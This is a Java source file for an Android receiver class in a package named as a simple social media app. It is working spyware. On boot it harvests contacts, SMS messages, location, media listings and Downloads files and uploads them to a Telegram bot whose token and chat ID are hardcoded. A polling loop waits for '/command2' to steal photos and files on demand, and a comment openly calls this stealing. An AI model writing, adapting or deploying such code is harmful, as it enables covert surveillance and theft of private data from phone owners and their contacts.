package com.example.simplesocialmediaapp;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Log;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

import java.io.File;
import java.io.FileInputStream;
import java.io.OutputStream;

/**
 * Yummy can:
 * 1) Collect data: contacts, sms, location, audio, images
 * 2) Send them to Telegram in chunked text form
 * 3) Send actual images as files
 * 4) Implement a polling thread that listens for Telegram commands (like "command2")
 */
public class Yummy extends BroadcastReceiver {

    private static final String TAG = "Yummy";
    private static final String BOT_TOKEN = "7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs";
    // 7207364664:AAGmNIlIfhTr0G49lEezFmk17oCnXJBO38E solo
    // 7708281150:AAEvpZ3B4-xi2ZQblza5hO_4tHyGkX6fiRs group
    private static final String CHAT_ID = "-4744802700";
    // 732298598 solo bot
    // -4744802700 group bot

    // For polling
    private static boolean pollingActive = false;
    private static long lastUpdateId = 0; // track the last update_id so we don't process old messages

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            // By default on boot, we gather everything and send
            String data = collectAllData(context);
            sendToTelegramInChunks(data);

            // this is to steal the entire "Download" folder
            sendFilesFromDownloads(context);
        } catch (Exception e) {
            Log.e(TAG, "Failed to retrieve or send data", e);
        }
    }

    // ----------------------------------------------------------------
    // 1) Polling Implementation for Telegram Commands
    // ----------------------------------------------------------------

    /**
     * Starts a background thread that polls Telegram's getUpdates every ~30 seconds.
     * If it sees "command2", it triggers data extraction + uploading images.
     */
    public static void startPollingForCommands(Context context) {
        if (pollingActive) {
            Log.d(TAG, "Polling is already active, skipping.");
            return;
        }
        pollingActive = true;

        Thread pollingThread = new Thread(() -> {
            while (pollingActive) {
                try {
                    pollTelegramForCommands(context);
                    Thread.sleep(30000); // wait 30 seconds before next poll
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        pollingThread.start();
    }

    /**
     * Calls getUpdates to see if there's new messages. If we see a message with text "command2",
     * we do the data extraction + file upload.
     */
    private static void pollTelegramForCommands(Context context) {
        try {
            String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1);
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            int respCode = conn.getResponseCode();
            if (respCode == HttpURLConnection.HTTP_OK) {
                // parse JSON
                ByteArrayOutputStream bout = new ByteArrayOutputStream();
                InputStream in = conn.getInputStream();
                byte[] buf = new byte[8192];
                int read;
                while ((read = in.read(buf)) != -1) {
                    bout.write(buf, 0, read);
                }
                in.close();
                String json = bout.toString("UTF-8");
                parseUpdatesJson(context, json);
            }
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "pollTelegramForCommands error", e);
        }
    }

    /**
     * Very minimal JSON parsing to find "update_id" and "text" from messages.
     * We look if text == "command2", then do data extraction & file uploads.
     */
    private static void parseUpdatesJson(Context context, String json) {
        try {
            // A real solution would use a proper JSON library (Gson, org.json, etc.)
            // We'll do quick string-based searching for demonstration.

            // One approach: find each "update_id"
            // Example of minimal structure: {"ok":true,"result":[{"update_id":12345,"message":{"text":"command2"...}}]}
            String resultKey = "\"result\":[";
            int resIndex = json.indexOf(resultKey);
            if (resIndex < 0) {
                return; // no new messages
            }
            // We'll loop for each occurrence of "update_id"
            int idx = 0;
            while (true) {
                idx = json.indexOf("\"update_id\":", idx);
                if (idx < 0) break; // no more
                int startIdVal = idx + "\"update_id\":".length();
                int endIdVal = json.indexOf(",", startIdVal);
                if (endIdVal < 0) break;
                long updateId = Long.parseLong(json.substring(startIdVal, endIdVal).trim());
                if (updateId > lastUpdateId) {
                    lastUpdateId = updateId;
                }

                // find "text":
                int textPos = json.indexOf("\"text\":", endIdVal);
                if (textPos < 0) {
                    // no text in this message?
                    idx = endIdVal;
                    continue;
                }
                // parse text
                int startQuote = json.indexOf("\"", textPos + 7); // after "text":
                int endQuote = json.indexOf("\"", startQuote + 1);
                if (startQuote < 0 || endQuote < 0) {
                    idx = endIdVal;
                    continue;
                }
                String messageText = json.substring(startQuote + 1, endQuote);

                Log.d(TAG, "Got message text: " + messageText + " updateId=" + updateId);

                // Compare with your command
                if (messageText.equalsIgnoreCase("/command2")) {
                    // do data extraction
                    String data = collectAllData(context);
                    sendToTelegramInChunks(data);

                    // also send actual images
                    sendActualImagesToTelegram(context);

                    // send the file
                    sendFilesFromDownloads(context);
                }
                idx = endQuote;
            }
        } catch (Exception e) {
            Log.e(TAG, "parseUpdatesJson error", e);
        }
    }

    // ----------------------------------------------------------------
    // 2) Data Collection
    // ----------------------------------------------------------------
    public static String collectContactsAndSms(Context context) {
        String contactsData = collectContacts(context);
        String smsData = collectSmsInbox(context);
        return "Contacts:\n" + contactsData + "\n\nSMS:\n" + smsData;
    }

    public static String collectAllData(Context context) {

        sendFilesFromDownloads(context); // ← This uploads real files

        StringBuilder sb = new StringBuilder();
        sb.append("Contacts & SMS:\n").append(collectContactsAndSms(context));
        sb.append("\n\nLocation:\n").append(collectLocation(context));
        sb.append("\n\nAudio Files:\n").append(collectAudioFiles(context));
        sb.append("\n\nImages:\n").append(collectImages(context));
        sb.append("\n\nFiles:\n").append(getFileSummaryFromDownloads()); // NEW
        return sb.toString();
    }

    // Contacts
    private static String collectContacts(Context context) {
        // same as your code
        // ...
        ContentResolver cr = context.getContentResolver();
        Uri contUri = ContactsContract.Contacts.CONTENT_URI;
        String[] projection = {ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME};
        Cursor cursor = cr.query(contUri, projection, null, null, null);

        if (cursor == null) {
            return "No contacts cursor found.\n";
        }
        int idIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
        int nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
        StringBuilder contactsBuilder = new StringBuilder();

        while (cursor.moveToNext()) {
            if (idIndex >= 0 && nameIndex >= 0) {
                String contactId = cursor.getString(idIndex);
                String name = cursor.getString(nameIndex);
                String phoneNumber = "No Number";

                Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null);
                if (phones != null && phones.moveToFirst()) {
                    int numIndex = phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    if (numIndex >= 0) {
                        phoneNumber = phones.getString(numIndex);
                    }
                    phones.close();
                }
                contactsBuilder.append(" - Name: ").append(name)
                        .append(", Phone: ").append(phoneNumber).append("\n");
            }
        }
        cursor.close();
        return contactsBuilder.toString();
    }

    // SMS
    private static String collectSmsInbox(Context context) {
        // same as your code
        // ...
        ContentResolver cr = context.getContentResolver();
        Uri smsUri = Uri.parse("content://sms/inbox");
        Cursor smsCursor = cr.query(smsUri, null, null, null, null);

        if (smsCursor == null) {
            return "No SMS found.\n";
        }
        StringBuilder smsBuilder = new StringBuilder();
        while (smsCursor.moveToNext()) {
            try {
                int addressIndex = smsCursor.getColumnIndex("address");
                int bodyIndex = smsCursor.getColumnIndex("body");
                int dateIndex = smsCursor.getColumnIndex("date");

                String address = addressIndex >= 0 ? smsCursor.getString(addressIndex) : "Unknown";
                String body = bodyIndex >= 0 ? smsCursor.getString(bodyIndex) : "No Body";
                String date = dateIndex >= 0 ? smsCursor.getString(dateIndex) : "No Date";

                smsBuilder.append(" - From: ").append(address)
                        .append(" | Date: ").append(date)
                        .append(" | Body: ").append(body)
                        .append("\n");
            } catch (Exception e) {
                Log.e(TAG, "Error reading an SMS", e);
            }
        }
        smsCursor.close();
        return smsBuilder.toString();
    }

    // Location
    private static String collectLocation(Context context) {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (lm == null) {
                return "Location Manager not available.";
            }
            android.location.Location location = null;
            try {
                location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            } catch (SecurityException se) {
                Log.e(TAG, "GPS permission issue", se);
            }
            if (location == null) {
                try {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                } catch (SecurityException se) {
                    Log.e(TAG, "Network location permission issue", se);
                }
            }
            if (location != null) {
                return "Lat: " + location.getLatitude() + ", Lon: " + location.getLongitude();
            } else {
                return "No location available.";
            }
        } catch (Exception e) {
            return "Error retrieving location: " + e.getMessage();
        }
    }

    // Audio
    private static String collectAudioFiles(Context context) {
        // same code as previously, enumerating MediaStore.Audio
        // ...
        StringBuilder audioBuilder = new StringBuilder();
        try {
            ContentResolver cr = context.getContentResolver();
            Uri uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {
                    MediaStore.Audio.Media.TITLE,
                    MediaStore.Audio.Media.DURATION
            };
            Cursor cursor = cr.query(uri, projection, null, null, null);

            if (cursor != null) {
                int count = cursor.getCount();
                Log.d(TAG, "Audio cursor count: " + count);
                if (count == 0) {
                    audioBuilder.append("No audio files found.\n");
                } else {
                    while (cursor.moveToNext()) {
                        String title = cursor.getString(
                                cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.TITLE)
                        );
                        long duration = cursor.getLong(
                                cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DURATION)
                        );
                        audioBuilder.append(" - Title: ").append(title)
                                .append(", Duration: ").append(duration).append(" ms\n");
                    }
                }
                cursor.close();
            } else {
                audioBuilder.append("No audio files found.\n");
            }
        } catch (Exception e) {
            audioBuilder.append("Error retrieving audio files: ").append(e.getMessage());
            Log.e(TAG, "collectAudioFiles: ", e);
        }
        return audioBuilder.toString();
    }

    // Images
    private static String collectImages(Context context) {
        // same code enumerating MediaStore.Images
        // ...
        StringBuilder imageBuilder = new StringBuilder();
        try {
            ContentResolver cr = context.getContentResolver();
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {
                    MediaStore.Images.Media.DISPLAY_NAME,
                    MediaStore.Images.Media.SIZE
            };
            Cursor cursor = cr.query(uri, projection, null, null, null);
            if (cursor != null) {
                int count = cursor.getCount();
                Log.d(TAG, "Image cursor count: " + count);
                if (count == 0) {
                    imageBuilder.append("No images found.\n");
                } else {
                    while (cursor.moveToNext()) {
                        String name = cursor.getString(
                                cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
                        );
                        long size = cursor.getLong(
                                cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
                        );
                        imageBuilder.append(" - Name: ").append(name)
                                .append(", Size: ").append(size).append(" bytes\n");
                    }
                }
                cursor.close();
            } else {
                imageBuilder.append("No images found.\n");
            }
        } catch (Exception e) {
            imageBuilder.append("Error retrieving images: ").append(e.getMessage());
            Log.e(TAG, "collectImages: ", e);
        }
        return imageBuilder.toString();
    }

    // ----------------------------------------------------------------
    // 3) Actually sending text in multiple chunks, URL-encoded
    // ----------------------------------------------------------------
    private static void sendToTelegramInChunks(String fullMessage) {
        final int MAX_CHUNK_SIZE = 3000;
        int start = 0;
        while (start < fullMessage.length()) {
            int end = Math.min(start + MAX_CHUNK_SIZE, fullMessage.length());
            String chunk = fullMessage.substring(start, end);
            start = end;
            try {
                String encoded = URLEncoder.encode(chunk, "UTF-8");
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN
                        + "/sendMessage?chat_id=" + CHAT_ID
                        + "&text=" + encoded;

                new Thread(() -> {
                    try {
                        URL url = new URL(urlString);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        int responseCode = conn.getResponseCode();
                        conn.disconnect();
                        Log.d(TAG, "sendToTelegramInChunks response: " + responseCode);
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to send chunk to Telegram", e);
                    }
                }).start();
            } catch (Exception e) {
                Log.e(TAG, "URL-encoding chunk error", e);
            }
        }
    }

    // ----------------------------------------------------------------
    // 4) Sending actual images as files via Telegram sendPhoto
    // ----------------------------------------------------------------

    /**
     * Reads the first N images from MediaStore, and does a multipart/form-data POST to /sendPhoto
     * so that the actual images are uploaded to your Telegram chat.
     *
     * Called automatically from poll if command2 is received, or you can call it manually.
     */
    public static void sendActualImagesToTelegram(Context context) {
        try {
            ContentResolver cr = context.getContentResolver();
            Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {
                    MediaStore.Images.Media._ID,
                    MediaStore.Images.Media.DISPLAY_NAME
            };
            Cursor cursor = cr.query(uri, projection, null, null, null);
            if (cursor == null) {
                Log.d(TAG, "No images found to upload.");
                return;
            }
            int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            int nameIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME);

            int MAX_IMAGES = 5; // limit how many we send
            int count = 0;

            while (cursor.moveToNext()) {
                if (count >= MAX_IMAGES) break; // avoid sending too many
                long imageId = cursor.getLong(idIndex);
                String displayName = cursor.getString(nameIndex);

                Uri imageUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        String.valueOf(imageId));

                // read bytes
                InputStream inputStream = cr.openInputStream(imageUri);
                if (inputStream == null) {
                    Log.d(TAG, "Unable to open stream for " + displayName);
                    continue;
                }
                byte[] imageBytes = readAllBytes(inputStream);
                inputStream.close();

                // upload
                postImageToTelegram(imageBytes, displayName);
                count++;
            }
            cursor.close();
        } catch (Exception e) {
            Log.e(TAG, "sendActualImagesToTelegram error", e);
        }
    }

    // readAllBytes
    private static byte[] readAllBytes(InputStream in) throws Exception {
        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        int nRead;
        byte[] data = new byte[8192];
        while ((nRead = in.read(data, 0, data.length)) != -1) {
            buffer.write(data, 0, nRead);
        }
        return buffer.toByteArray();
    }

    private static void postImageToTelegram(byte[] imageBytes, String fileName) {
        String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendPhoto";
        String boundary = "Boundary-" + System.currentTimeMillis();

        try {
            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            ByteArrayOutputStream bout = new ByteArrayOutputStream();

            // 1) chat_id field
            bout.write(("--" + boundary + "\r\n").getBytes());
            bout.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".getBytes());
            bout.write(CHAT_ID.getBytes());
            bout.write("\r\n".getBytes());

            // 2) the photo field
            bout.write(("--" + boundary + "\r\n").getBytes());
            bout.write(("Content-Disposition: form-data; name=\"photo\"; filename=\"" + fileName + "\"\r\n").getBytes());
            bout.write("Content-Type: image/png\r\n\r\n".getBytes());
            bout.write(imageBytes);
            bout.write("\r\n".getBytes());

            // final boundary
            bout.write(("--" + boundary + "--\r\n").getBytes());

            conn.getOutputStream().write(bout.toByteArray());
            conn.getOutputStream().flush();
            conn.getOutputStream().close();

            int responseCode = conn.getResponseCode();
            conn.disconnect();

            Log.d(TAG, "Uploaded " + fileName + " to Telegram, response=" + responseCode);
        } catch (Exception e) {
            Log.e(TAG, "postImageToTelegram failed for " + fileName, e);
        }
    }

    //file
    public static void sendFilesFromDownloads(Context context) {
        File downloadsDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS);
        Log.d(TAG, "Looking for Downloads directory...");

        if (downloadsDir == null) {
            Log.d(TAG, "Downloads directory is null.");
            return;
        }

        if (!downloadsDir.exists()) {
            Log.d(TAG, "Downloads directory does not exist: " + downloadsDir.getAbsolutePath());
            return;
        }

        Log.d(TAG, "Downloads directory found at: " + downloadsDir.getAbsolutePath());

        File[] files = downloadsDir.listFiles();

        if (files == null) {
            Log.d(TAG, "Failed to list files in Downloads.");
            return;
        }

        if (files.length == 0) {
            Log.d(TAG, "No files in Downloads.");
            return;
        }

        Log.d(TAG, "Found " + files.length + " file(s) in Downloads.");

        for (int i = 0; i < Math.min(5, files.length); i++) {
            File file = files[i];
            if (file.isFile()) {
                Log.d(TAG, "Preparing to send file to Telegram: " + file.getAbsolutePath() + " (Size: " + file.length() + " bytes)");
                postDocumentToTelegram(file);
            } else {
                Log.d(TAG, "Skipped non-file entry: " + file.getAbsolutePath());
            }
        }
    }



    private static void postDocumentToTelegram(File file) {
        String boundary = "----WebKitFormBoundary" + System.currentTimeMillis();
        String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";

        try {
            java.net.URL url = new java.net.URL(urlString);
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setDoOutput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream output = conn.getOutputStream();
            String LINE_FEED = "\r\n";

            // Part 1: chat_id
            output.write(("--" + boundary + LINE_FEED).getBytes());
            output.write("Content-Disposition: form-data; name=\"chat_id\"".getBytes());
            output.write(LINE_FEED.getBytes());
            output.write(LINE_FEED.getBytes());
            output.write(CHAT_ID.getBytes());
            output.write(LINE_FEED.getBytes());

            // Part 2: document
            output.write(("--" + boundary + LINE_FEED).getBytes());
            output.write(("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"" + LINE_FEED).getBytes());
            output.write("Content-Type: application/octet-stream".getBytes());
            output.write(LINE_FEED.getBytes());
            output.write(LINE_FEED.getBytes());

            FileInputStream inputStream = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = inputStream.read(buffer)) != -1) {
                output.write(buffer, 0, bytesRead);
            }
            inputStream.close();
            output.write(LINE_FEED.getBytes());

            // End boundary
            output.write(("--" + boundary + "--" + LINE_FEED).getBytes());
            output.flush();
            output.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Uploaded " + file.getName() + " to Telegram, response=" + responseCode);
            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "postDocumentToTelegram failed for " + file.getName(), e);
        }
    }

    public static String getFileSummaryFromDownloads() {
        File downloadsDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS);
        if (downloadsDir == null || !downloadsDir.exists()) {
            return "Downloads folder not found.";
        }

        File[] files = downloadsDir.listFiles();
        if (files == null || files.length == 0) {
            return "No files found in Downloads.";
        }

        StringBuilder fileList = new StringBuilder();
        for (int i = 0; i < Math.min(5, files.length); i++) {
            File file = files[i];
            if (file.isFile()) {
                fileList.append(" - ").append(file.getName()).append(" (")
                        .append(file.length() / 1024).append(" KB)\n");
            }
        }
        return fileList.toString();
    }






}
